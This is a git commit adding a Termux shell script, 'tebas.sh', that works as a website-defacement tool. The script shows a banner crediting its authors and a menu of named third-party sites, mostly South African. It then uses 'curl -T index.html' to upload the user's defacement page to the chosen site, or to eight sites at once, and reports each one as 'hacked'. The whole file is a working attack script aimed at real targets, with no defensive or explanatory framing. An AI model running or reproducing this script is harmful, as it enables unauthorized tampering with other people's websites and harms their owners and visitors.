117814bda9b3a454f31a488c18652956fb18375c
R133F <48719300+R133F@users.noreply.github.com>
2019-05-22 21:43:53 +0800

    Add files via upload

---
+++ tebas.sh
@@ -0,0 +1,121 @@
+#!/bin/sh
+Cy='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+e='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+
+echo $pur"________________________________________________"
+echo $pur"|        INDONYMOUS TEBAS INDEX TOOLS          |"
+echo $pur"|         Tools BY:Rieeef / Mr.Cybers.         |"
+echo $pur"|       Channel Youtube:Bloody Gaming71        |"
+echo $cy"|           Facebook:Mohammad Kelvin           |"
+echo $cy"|             instagram:Mr.Cyber               |"
+echo $ku"|      Jangan Lupa Subscribe Channel aing      |"
+echo $cy"|            Thanks to  : Mr.BR1NG4S           |"
+echo $i"|        Terima Kasih Juga pada kalian ^_^     |"
+echo $i"|     Yang terus support saya sampai sekarang. |"
+echo $cy"################################################"
+
+echo $e"{0} MULTI D3F4C3S "
+echo $e"{1} http://uzingela.co.za"
+echo $e"{2} http://thefoundation.co.za"
+echo $e"{3} http://techdirect.co.za"
+echo $e"{4} http://tieronecapital.co.za"
+echo $e"{5} http://totemafrica.com"
+echo $e"{6} http://ziady.com       "
+echo $e"{7} http://whadiz.com"
+echo $me"Pastikan Nama SC Deface Kamu index.html"
+echo $me"Pastikan Juga sc index.html mu ada di Memory internal Kamu"
+echo
+read -p"Nomer Berapa yang mau Ditebas? : " pil
+
+if [ $pil = 0 ]
+then 
+clear
+termux-setup-storage
+cd /sdcard
+curl -T index.html http://lwrm.co.za/
+curl -T index.html http://handj.co.za/
+curl -T index.html http://megro.co.za/
+curl -T index.html http://scnc.co.za/
+curl -T index.html http://lpenterprises.co.za
+curl -T index.html http://mc3qs.com/
+curl -T index.html http://tressor.co.za/
+curl -T index.html http://daretogowildafrica.co.za/
+echo $me"INI WEB YANG KAMU TEBAS INDEXNYA MUNGKIN ADA YANG GAK KENA SILAHKAN CHECK SENDIRI "
+echo $i"http://lwrm.co.za/"
+echo $i"http://handj.co.za/              "
+echo $i"http://megro.co.za/              "
+echo $i"http://scnc.co.za/               "
+echo $i"http://lpenterprises.co.za       "
+echo $i"http://mc3qs.com/                "
+echo $i"http://tressor.co.za/            "
+echo $i"http://daretogowildafrica.co.za/ "
+
+fi
+
+if [ $pil = 1 ]
+then
+clear
+termux-setup-storage
+cd /sdcard
+curl -T index.html http://uzingela.co.za
+echo $i"Terhack Ini Linknya silahkan Di check : http://uzingela.co.za"
+fi
+
+if [ $pil = 2 ]
+then
+clear
+termux-setup-storage
+cd /sdcard
+curl -T index.html http://thefoundation.co.za
+echo $i"Terhack Ini Linknya silahkan Di Check : http://thefoundation.co.za"
+fi
+
+if [ $pil = 3 ]
+then
+clear
+termux-setup-storage
+cd /sdcard                                           
+curl -T index.html http://techdirect.co.za
+echo $i"Terhack Ini Linknya silahkan Di check : http://techdirect.co.za"
+fi
+
+if [ $pil = 4 ]
+then
+clear
+termux-setup-storage
+cd /sdcard
+curl -T index.html http://tieronecapital.co.za
+echo $i"Terhack Ini Linknya silahkan Di check : http://tieronecapital.co.za"
+fi
+
+if [ $pil = 5 ]
+then
+clear
+termux-setup-storage
+cd /sdcard
+curl -T index.html http://totemafrica.com
+echo $i"Terhack Ini Linknya silahkan Di check : http://totemafrica.com"
+fi
+
+if [ $pil = 6 ]
+then
+clear
+termux-setup-storage
+cd /sdcard
+curl -T index.html http://ziady.com
+echo $i"Terhack Ini Linknya silahkan Di check : http://ziady.com "
+fi
+
+if [ $pil = 7 ]
+then
+clear
+termux-setup-storage
+cd /sdcard
+curl -T index.html http://whadiz.com
+echo $i"Terhack Ini Linknya silahkan Di check : http://whadiz.com"
+fi
